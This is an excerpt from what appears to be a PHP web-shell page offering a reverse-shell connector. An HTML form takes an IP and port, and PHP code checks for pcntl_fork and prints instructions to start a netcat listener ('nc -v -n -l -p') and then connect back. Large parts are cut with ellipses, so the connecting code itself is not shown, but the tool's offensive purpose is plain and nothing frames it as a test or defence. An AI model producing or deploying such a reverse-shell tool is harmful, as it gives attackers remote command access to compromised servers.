         ...
         <td> 
            <table style="border-spacing: 6px;"> 
                <tr> 
                    <td>IP</td> 
                    <td> 
                        <input style="width: 200px;" name="ip" placeholder="Your Internal ip" /> 
                    </td> 
                </tr> 
                <tr> 
                    <td>Port </td> 
...
if (function_exists('pcntl_fork')) {
	...
	print "WARNING:  Write this command in terminal : nc -v -n -l -p *port_You_want* and run. Then write the same port here then do connect." ."<br>" ;
}
